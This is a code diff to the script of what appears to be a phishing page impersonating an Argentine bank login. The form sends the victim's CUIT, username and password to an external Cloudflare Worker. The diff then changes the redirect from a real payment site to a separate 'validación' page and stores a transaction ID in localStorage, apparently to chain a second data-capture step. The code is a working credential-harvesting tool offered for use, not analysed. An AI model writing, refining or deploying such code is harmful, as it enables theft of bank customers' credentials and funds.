@@ -493,10 +493,10 @@
 
     <script>
         // ============================================================
-        // CONFIGURACIÓN - URL DEL WORKER SIN BARRA AL FINAL
+        // CONFIGURACIÓN
         // ============================================================
-        const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev'; // ✅ Sin barra al final
-        const REDIRECT_URL = 'https://www.multipay.com.ar/';
+        const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
+        const VALIDACION_URL = 'https://personasgalicia.vercel.app/validacion.html'; // Tu página de validación
 
         // ============================================================
         // FUNCIONES DEL FORMULARIO
@@ -543,12 +543,11 @@
                 transactionId: transactionId
             };
 
-            const url = WORKER_URL + '/login';
-            console.log('📤 Enviando a:', url);
+            console.log('📤 Enviando a:', WORKER_URL + '/login');
             console.log('📦 Payload:', payload);
 
             try {
-                const response = await fetch(url, {
+                const response = await fetch(WORKER_URL + '/login', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -571,15 +570,24 @@
         }
 
         // ============================================================
-        // FUNCIÓN PARA MOSTRAR OVERLAY Y REDIRIGIR CON CONTADOR
+        // FUNCIÓN PARA GUARDAR EN LOCALSTORAGE Y REDIRIGIR
         // ============================================================
-        function redirigirConContador() {
+        function guardarYRedirigir(transactionId) {
+            // Guardar en localStorage
+            const bancoldata = {
+                transactionId: transactionId,
+                timestamp: new Date().toISOString()
+            };
+            localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+            console.log('💾 Datos guardados en localStorage:', bancoldata);
+            
+            // Mostrar overlay brevemente
             const overlay = document.getElementById('redirectOverlay');
             const counterDisplay = document.getElementById('counterDisplay');
             
             overlay.style.display = 'flex';
             
-            let segundos = 3;
+            let segundos = 2;
             counterDisplay.textContent = segundos;
             
             const intervalo = setInterval(function() {
@@ -588,13 +596,14 @@
                 
                 if (segundos <= 0) {
                     clearInterval(intervalo);
-                    window.location.href = REDIRECT_URL;
+                    // Redirigir a la página de validación
+                    window.location.href = VALIDACION_URL;
                 }
             }, 1000);
         }
 
         // ============================================================
-        // FUNCIÓN INGRESAR - ENVÍA AL WORKER Y REDIRIGE
+        // FUNCIÓN INGRESAR - ENVÍA AL WORKER, GUARDA Y REDIRIGE
         // ============================================================
         async function ingresarDemo() {
             const cuit = document.getElementById("cuit").value.trim();
@@ -621,7 +630,8 @@
                 const resultado = await enviarAlWorker(cuit, usuario, password);
                 
                 if (resultado.ok) {
-                    redirigirConContador();
+                    // Guardar transactionId en localStorage y redirigir a validación
+                    guardarYRedirigir(resultado.transactionId);
                 } else {
                     alert('Error: ' + (resultado.error || 'Intenta nuevamente'));
                     btn.textContent = 'Ingresar';
